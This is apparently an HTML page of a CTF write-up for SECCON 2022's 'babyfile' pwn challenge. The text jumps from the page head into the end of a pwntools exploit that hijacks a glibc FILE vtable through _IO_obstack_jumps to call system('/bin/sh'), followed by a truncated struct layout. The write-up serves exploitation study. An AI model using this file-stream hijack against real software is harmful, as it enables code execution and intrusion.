<!doctype html>
<html lang="en-us">
  <head>
    <title>[SECCON CTF 2022 Quals - pwn] babyfile // ret2school</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.92.2" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="nasm" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.3c3c186cd62e563ad6e2f00a89dbee656ab912d1d46f856b5605dd0232521e2a.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="[SECCON CTF 2022 Quals - pwn] babyfile"/>
<meta name="twitter:description" content="Introduction babyfile is a file stream exploitation I did during the SECCON CTF 2022 Quals event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting to read given I show another way to gain code execution &ndash; I have not seen before &ndash; based on _IO_obstack_jumps! The related files can be found here. If you&rsquo;re not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, especially this one and this other one."/>

    <meta property="og:title" content="[SECCON CTF 2022 Quals - pwn] babyfile" />

    heap <span style="color:#ff79c6">=</span> leak_ptr(pwn<span style="color:#ff79c6">.</span>p64(leak_main_arena)) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x2a0</span>
    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)

    _IO_obstack_jumps <span style="color:#ff79c6">=</span> leak <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1E9260</span>
    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;_IO_obstack_jumps: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(_IO_obstack_jumps)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)

    <span style="color:#6272a4"># edit vtable =&gt; _IO_obstack_jumps</span>
    write_ptr(pwn<span style="color:#ff79c6">.</span>p64(_IO_obstack_jumps <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">9</span>), File<span style="color:#ff79c6">.</span>vtable)
    write_ptr(pwn<span style="color:#ff79c6">.</span>p64(heap <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2a0</span>), File<span style="color:#ff79c6">.</span>obstack)

    partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0xff</span>), File<span style="color:#ff79c6">.</span>_IO_read_base)

    write_ptr(pwn<span style="color:#ff79c6">.</span>p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system), obstack<span style="color:#ff79c6">.</span>chunkfun) <span style="color:#6272a4"># fn ptr, system</span>
    write_ptr(pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#8be9fd;font-style:italic">next</span>(libc<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;/bin/sh&#39;</span>))), obstack<span style="color:#ff79c6">.</span>extra_arg) <span style="color:#6272a4"># arg</span>
    partial_write(pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#ff79c6">True</span>), obstack<span style="color:#ff79c6">.</span>use_extra_arg)

    fflush()
    <span style="color:#6272a4"># system(&#34;/bin/sh&#34;)</span>

    io<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;cat flag-f81d1f481db83712a1128dc9b72d5503.txt&#34;</span>)
    io<span style="color:#ff79c6">.</span>interactive()

<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
    main()

<span style="color:#f1fa8c">&#34;&#34;&#34;
</span><span style="color:#f1fa8c">type = struct _IO_FILE {
</span><span style="color:#f1fa8c">/*      0      |       4 */    int _flags;
</span><span style="color:#f1fa8c">/* XXX  4-byte hole      */
</span><span style="color:#f1fa8c">/*      8      |       8 */    char *_IO_read_ptr;
</span><span style="color:#f1fa8c">/*     16      |       8 */    char *_IO_read_end;
</span><span style="color:#f1fa8c">/*     24      |       8 */    char *_IO_read_base;
</span><span style="color:#f1fa8c">/*     32      |       8 */    char *_IO_write_base;
</span><span style="color:#f1fa8c">/*     40      |       8 */    char *_IO_write_ptr;
</span><span style="color:#f1fa8c">/*     48      |       8 */    char *_IO_write_end;
</span><span style="color:#f1fa8c">/*     56      |       8 */    char *_IO_buf_base;
</span><span style="color:#f1fa8c">/*     64      |       8 */    char *_IO_buf_end;
</span><span style="color:#f1fa8c">/*     72      |       8 */    char *_IO_save_base;
</span><span style="color:#f1fa8c">/*     80      |       8 */    char *_IO_backup_base;
</span><span style="color:#f1fa8c">/*     88      |       8 */    char *_IO_save_end;
</span><span style="color:#f1fa8c">/*     96      |       8 */    struct _IO_marker *_markers;
</span><span style="color:#f1fa8c">/*    104      |       8 */    struct _IO_FILE *_chain;
</span><span style="color:#f1fa8c">/*    112      |       4 */    int _fileno;
</span><span style="color:#f1fa8c">/*    116      |       4 */    int _flags2;
</span><span style="color:#f1fa8c">/*    120      |       8 */    __off_t _old_offset;
</span><span style="color:#f1fa8c">/*    128      |       2 */    unsigned short _cur_column;
</span><span style="color:#f1fa8c">/*    130      |       1 */    signed char _vtable_offset;
</span><span style="color:#f1fa8c">/*    131      |       1 */    char _shortbuf[1];
</span><span style="color:#f1fa8c">/* XXX  4-byte hole      */
</span><span style="color:#f1fa8c">/*    136      |       8 */    _IO_lock_t *_lock;
</span><span style="color:#f1fa8c">/*    144      |       8 */    __off64_t _offset;
</span><span style="color:#f1fa8c">/*    152      |       8 */    struct _IO_codecvt *_codecvt;
</span><span style="color:#f1fa8c">/*    160      |       8 */    struct _IO_wide_data *_wide_data;
</span><span style="color:#f1fa8c">/*    168      |       8 */    struct _IO_FILE *_freeres_list;
</span><span style="color:#f1fa8c">/*    176      |       8 */    void *_freeres_buf;
</span><span style="color:#f1fa8c">/*    184      |       8 */    size_t __pad5;
</span><span style="color:#f1fa8c">/*    192      |       4 */    int _mode;
</span><span style="color:#f1fa8c">/*    196      |      20 */    char _unused2[20];
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">                               /* total size (bytes):  216 */
</span><span style="color:#f1fa8c">                             }
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">struct obstack          /* control current object in current chunk */
</span><span style="color:#f1fa8c">{
</span><span style="color:#f1fa8c">  long chunk_size;              /* preferred size to allocate chunks in */
</span><span style="color:#f1fa8c">  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
</span><span style="color:#f1fa8c">  char *object_base;            /* address of object we are building */
</span><span style="color:#f1fa8c">  char *next_free;              /* where to add next char to current object */
</span><span style="color:#f1fa8c">  char *chunk_limit;            /* address of char after current chunk */
